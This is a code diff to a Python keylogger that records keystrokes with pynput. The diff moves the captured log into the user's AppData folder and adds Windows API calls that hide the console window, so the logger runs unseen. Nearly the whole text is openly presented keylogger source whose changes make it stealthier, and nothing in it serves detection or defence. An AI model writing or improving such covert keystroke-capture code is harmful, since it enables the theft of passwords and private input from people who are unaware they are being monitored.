@@ -1,5 +1,7 @@
 import pynput.keyboard
 import time
+import os
+import sys
 
 def run():
     log = []
@@ -18,8 +20,22 @@ def run():
     listener.stop()
 
     log_data = ''.join(log)
-    with open('keylogger_output.txt', 'w') as file:
+
+    # Save the log to a file in the user's AppData folder
+    log_file = os.path.join(os.getenv('APPDATA'), 'keylogger_output.txt')
+    with open(log_file, 'w') as file:
         file.write(log_data)
 
-    return 'keylogger_output.txt'
+    return log_file
+
+if __name__ == "__main__":
+    # Hide the console window (for running outside of terminal)
+    if not sys.stdout.isatty():
+        import ctypes
+        whnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if whnd != 0:
+            ctypes.windll.user32.ShowWindow(whnd, 0)
+            ctypes.windll.kernel32.CloseHandle(whnd)
+
+    run()
 
